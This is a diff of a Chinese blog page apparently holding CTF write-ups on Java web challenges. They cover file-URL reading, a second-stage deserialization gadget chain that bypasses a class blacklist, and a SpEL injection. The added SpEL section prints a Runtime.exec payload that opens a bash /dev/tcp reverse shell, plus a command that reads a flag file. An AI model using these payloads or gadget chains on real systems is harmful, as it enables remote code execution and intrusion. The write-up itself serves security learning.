@@ -23,31 +23,34 @@
 <meta property="og:site_name" content="RenDongjun&#39;s Blog">
 <meta property="og:description" content="几道java题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/ezjava1.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl1.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl4.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/objectinputstream.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl5.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl6.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl9.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl10.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/babyurl11.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/11.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/12.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/13.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/14.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/15.png">
-<meta property="og:image" content="e:/viper3/myblog/source/_posts/img/16.png">
+<meta property="og:image" content="http://example.com/img/ezjava1.png">
+<meta property="og:image" content="http://example.com/img/babyurl1.png">
+<meta property="og:image" content="http://example.com/img/babyurl4.png">
+<meta property="og:image" content="http://example.com/img/objectinputstream.png">
+<meta property="og:image" content="http://example.com/img/babyurl5.png">
+<meta property="og:image" content="http://example.com/img/babyurl6.png">
+<meta property="og:image" content="http://example.com/img/babyurl9.png">
+<meta property="og:image" content="http://example.com/img/babyurl10.png">
+<meta property="og:image" content="http://example.com/img/babyurl11.png">
+<meta property="og:image" content="http://example.com/img/11.png">
+<meta property="og:image" content="http://example.com/img/12.png">
+<meta property="og:image" content="http://example.com/img/13.png">
+<meta property="og:image" content="http://example.com/img/14.png">
+<meta property="og:image" content="http://example.com/img/15.png">
+<meta property="og:image" content="http://example.com/img/16.png">
 <meta property="og:image" content="e:/viper3/myblog/source/_posts/img/deserbug1.png">
 <meta property="og:image" content="e:/viper3/myblog/source/_posts/img/deserbug2.png">
 <meta property="og:image" content="e:/viper3/myblog/source/_posts/img/deserbug3.png">
 <meta property="og:image" content="http://example.com/img/Sshirobypass.png">
+<meta property="og:image" content="http://example.com/img/polarspel1.png">
+<meta property="og:image" content="http://example.com/img/polarjava.png">
+<meta property="og:image" content="http://example.com/img/polarspel2.png">
 <meta property="article:published_time" content="2024-04-20T12:08:50.000Z">
-<meta property="article:modified_time" content="2024-04-27T11:26:11.019Z">
+<meta property="article:modified_time" content="2024-05-23T02:51:38.603Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="做题记录">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="e:/viper3/myblog/source/_posts/img/ezjava1.png">
+<meta name="twitter:image" content="http://example.com/img/ezjava1.png">
   
   
   
@@ -216,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          25k 字
+          27k 字
         
       </span>
     
@@ -227,7 +230,7 @@
         
         
         
-          208 分钟
+          226 分钟
         
       </span>
     
@@ -277,7 +280,7 @@
 <h2 id="VNCTF2022公开赛-easyJava"><a href="#VNCTF2022公开赛-easyJava" class="headerlink" title="[VNCTF2022公开赛]easyJava"></a>[VNCTF2022公开赛]easyJava</h2><p>右键看源码，提示了<code>&lt;!-- /file? --&gt;</code></p>
 <p><code>get</code>传参<code>url</code>，比如：</p>
 <p><code>file?url=file:///</code>显示根目录下的文件：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/ezjava1.png" srcset="/img/loading.gif" lazyload alt="ezjava1"></p>
+<p><img src="/img/ezjava1.png" srcset="/img/loading.gif" lazyload alt="ezjava1"></p>
 <p>没法直接读<code>flag</code>，直接利用<code>file?url=file:///proc/self/environ</code>看当前工作目录：</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:/usr/local/tomcat</span><br></code></pre></td></tr></table></figure>
 
@@ -343,23 +346,23 @@
 <p><a target="_blank" rel="noopener" href="https://www.xiinnn.com/posts/2023dfjk-babyurl/">2</a></p>
 <p>拿到<code>jar</code>文件直接丢IDEA反编译下，注意下面这几个类：</p>
 <p><code>IndexController.java</code>存在：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl1.png" srcset="/img/loading.gif" lazyload alt="babyurl1"></p>
+<p><img src="/img/babyurl1.png" srcset="/img/loading.gif" lazyload alt="babyurl1"></p>
 <p><code>/hack</code>路由接受<code>payload</code>参数，<code>base64</code>解码后反序列化，然后再把反序列化的结果<code>o</code>和它的属性<code>url</code>打印出来。<code>MyObjectInputStream</code>是他自定义的输入流的类：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl4.png" srcset="/img/loading.gif" lazyload alt="babyurl4"></p>
+<p><img src="/img/babyurl4.png" srcset="/img/loading.gif" lazyload alt="babyurl4"></p>
 <p><code>String</code>数组是这个：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br></code></pre></td></tr></table></figure>
 
-<p><img src="E:/viper3/myblog/source/_posts/img/objectinputstream.png" srcset="/img/loading.gif" lazyload alt="objectinputstream"></p>
-<p>作用就是在反序列化过程中阻止特定类反序列化。这里看看他后面自己定义那两个：<br><img src="E:/viper3/myblog/source/_posts/img/babyurl5.png" srcset="/img/loading.gif" lazyload alt="babyurl5"></p>
+<p><img src="/img/objectinputstream.png" srcset="/img/loading.gif" lazyload alt="objectinputstream"></p>
+<p>作用就是在反序列化过程中阻止特定类反序列化。这里看看他后面自己定义那两个：<br><img src="/img/babyurl5.png" srcset="/img/loading.gif" lazyload alt="babyurl5"></p>
 <p>主要作用就是读取特定<code>URL</code>的内容并返回，但注意<code>ban</code>了<code>file</code>协议。</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl6.png" srcset="/img/loading.gif" lazyload alt="babyurl6"></p>
+<p><img src="/img/babyurl6.png" srcset="/img/loading.gif" lazyload alt="babyurl6"></p>
 <p>简单说就是通过重写<code>readObject</code>方法把<code>URLvisiter</code>的结果写到<code>tmp/file</code>文件中。</p>
 <p>现在解题思路就很清晰了：通过反序列化特定的<code>URLHelper</code>实例调用其重写的<code>readObject</code>方法达到将特定<code>URL</code>中的内容写到特定文件中：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLHelper</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);<br><span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br><span class="hljs-type">Field</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;visiter&quot;</span>);<br>aaa.set(handler,urlVisiter);<br></code></pre></td></tr></table></figure>
 
 <p>但问题是<code>ban</code>了这两个关键类。。所以要考虑别的方法：二次反序列化</p>
 <p><code>SignedObject</code>类存在<code>getObject</code>方法，里面调用了<code>readObject</code>：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl9.png" srcset="/img/loading.gif" lazyload alt="babyurl9"></p>
+<p><img src="/img/babyurl9.png" srcset="/img/loading.gif" lazyload alt="babyurl9"></p>
 <p>而且<code>content</code>完全可控，看它的构造方法，初始化时直接进行了序列化：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey, Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>    <span class="hljs-comment">// 创建一个 ByteArrayOutputStream 对象，它是一个字节数组输出流，用于将对象序列化后的数据写入字节数组</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <br>    <span class="hljs-comment">// 创建一个 ObjectOutputStream 对象，并将其连接到 ByteArrayOutputStream 上，用于将对象序列化为字节流</span><br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>    <span class="hljs-comment">// 将传入的对象 object 序列化为字节流，并将其写入到 ByteArrayOutputStream 中</span><br>    a.writeObject(object);<br>    <br>    <span class="hljs-comment">// 刷新 ObjectOutputStream，确保所有数据都被写入到 ByteArrayOutputStream 中</span><br>    a.flush();<br>    <br>    <span class="hljs-comment">// 关闭 ObjectOutputStream，释放资源</span><br>    a.close();<br>    <br>    <span class="hljs-comment">// 将 ByteArrayOutputStream 中的字节数据转换为字节数组，并赋值给 SignedObject 中的 content 属性</span><br>    <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>    <br>    <span class="hljs-comment">// 关闭 ByteArrayOutputStream，释放资源</span><br>    b.close();<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -372,29 +375,29 @@
 <p><a target="_blank" rel="noopener" href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">参考文章</a></p>
 <p>这里直接照搬这两位师傅的分析：</p>
 <p>在jackson中将对象序列化成一个json串主要是使用的<code>ObjectMapper#writeValueAsString</code>方法</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl10.png" srcset="/img/loading.gif" lazyload alt="babyurl10"></p>
+<p><img src="/img/babyurl10.png" srcset="/img/loading.gif" lazyload alt="babyurl10"></p>
 <p>然后跟进到_writeValueAndClose里面</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/babyurl11.png" srcset="/img/loading.gif" lazyload alt="babyurl11"></p>
+<p><img src="/img/babyurl11.png" srcset="/img/loading.gif" lazyload alt="babyurl11"></p>
 <p>跟进到这个序列化函数里，后面就类似于封装了，层层调用</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p><img src="/img/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
 <p>然后调用到最终的这个serializeFields方法</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
+<p><img src="/img/12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
 <p>这里其实就是通过三元运算符进行<code>getter</code>方法的调用：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (_accessorMethod == <span class="hljs-literal">null</span>) ? _field.get(bean)<br>	: _accessorMethod.invoke(bean, (Object[]) <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>
 
 <p>哪些地方可以调用writeValueAsString方法？</p>
 <p>PojoNode下存在nodeToString方法，调用了这个writeValueAsString：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
+<p><img src="/img/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
 <p>BaseJsonNode的toString方法调用了这个nodeToString:</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
+<p><img src="/img/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
 <p>这里注意这俩类的关系：这个类是一个抽象类，POJONode就属于它的一个实现类(父与子，我们后面可以通过调用<code>POJONode.toString</code>方法调用它自身的<code>nodeToString</code>方法)</p>
 <p>BadAttributeValueExpException下的eadObject方法调用了toString:</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
+<p><img src="/img/15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
 <p>现在可以捋下思路：</p>
 <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean">BadAttributeValueExpException#readObject-&gt;<br>	POJONode#toString-&gt;<br>		ObjectWriter#writeValueAsString-&gt;<br>			SignedObject#getObject-&gt;<br>				二次反序列化-&gt;<br>					URLHelper#readObject-&gt;<br>						URLVisiter#visitUrl<br>第一次反序列化为了调用getObject方法，第二次反序列化才是恶意类的反序列化<br></code></pre></td></tr></table></figure>
 
 <p>然后这里有个坑，<a target="_blank" rel="noopener" href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">参考文章</a><br>主要就是<code>BaseJsonNode类</code>在反序列化时会走他自定义的一个<code>writeReplace</code>方法：</p>
-<p><img src="E:/viper3/myblog/source/_posts/img/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
+<p><img src="/img/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
 <p>可以通过反射直接把它删了：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>    jsonNode.removeMethod(writeReplace);<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">//代码获取当前线程的上下文类加载器。然后，使用toClass方法将修改后的BaseJsonNode类定义加载到JVM中。</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -463,9 +466,24 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.vaadin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>vaadin-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.7.14<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p><code>IndexController.java</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>## [D^3CTF <span class="hljs-number">2022</span>] shorter<br><br>```java<br><span class="hljs-comment">//MainController.java</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainController</span> &#123;<br>   <span class="hljs-meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@PostMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String baseStr)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span> (baseStr.length() &gt;= <span class="hljs-number">1956</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;too long&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(baseStr);<br>         <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode);<br>         <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>         objectInputStream.readObject();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>      &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
 
+<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//spel.java</span><br><span class="hljs-meta">@RestController</span> <span class="hljs-comment">// 声明该类是一个 REST 控制器，可以处理 HTTP 请求和响应</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span> <span class="hljs-comment">// 映射处理该类的请求路径为 &quot;/SPEL&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spel</span> &#123; <span class="hljs-comment">// 定义一个名为 spel 的类</span><br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/vul&quot;&#125;)</span> <span class="hljs-comment">// 映射处理 &quot;/SPEL/vul&quot; 路径的请求</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spelVul</span><span class="hljs-params">(String ex)</span> &#123; <span class="hljs-comment">// 定义一个名为 spelVul 的方法，接收一个名为 ex 的参数</span><br>      <span class="hljs-comment">// 创建 SpEL 表达式解析器</span><br>      <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>      <span class="hljs-comment">// 创建 SpEL 表达式的评估上下文</span><br>      <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">evaluationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>      <span class="hljs-comment">// 解析并执行传入的 SpEL 表达式，获取结果，并转换为字符串</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br>      <span class="hljs-comment">// 将结果打印到控制台</span><br>      System.out.println(result);<br>      <span class="hljs-comment">// 返回结果字符串</span><br>      <span class="hljs-keyword">return</span> result;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<p>进去是个报错页面：</p>
+<p><img src="/img/polarspel1.png" srcset="/img/loading.gif" lazyload alt="polarspel1"></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">参考文章</a></p>
+<p>Spring Boot 框架Whitelabel Error Page SpEL注入的原因就是系统报错页面把用户的输入当做了表达式来执行。但这题没啥花花绕绕的，直接就能执行命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br></code></pre></td></tr></table></figure>
+
+<p>这里直接将用户的输入<code>ex</code>当作表达式内容进行解析。</p>
+<p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code>：</p>
+<p><img src="/img/polarjava.png" srcset="/img/loading.gif" lazyload alt="polarjava"></p>
+<p>两种解法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// [shell_b64_encode] 为 bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 的 base64 编码，注意 IP 须为外网地址，且目标能出网</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&#125;|[shell_b64_encode]&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br><span class="hljs-comment">// 读取 flag</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /app/flag.txt&quot;</span>&#125;).start().getInputStream(), <span class="hljs-string">&quot;utf8&quot;</span>)).readLine()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/polarspel2.png" srcset="/img/loading.gif" lazyload alt="polarspel2"></p>
+<h2 id="backendservice"><a href="#backendservice" class="headerlink" title="backendservice"></a>backendservice</h2>
                 
               </div>
             
@@ -534,9 +552,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/" title="最近做的三道JS题">
+                      <a href="/2024/04/20/%E3%80%8APython%E5%B7%A5%E5%8C%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="《Python工匠》读书笔记">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">最近做的三道JS题</span>
+                        <span class="hidden-mobile">《Python工匠》读书笔记</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
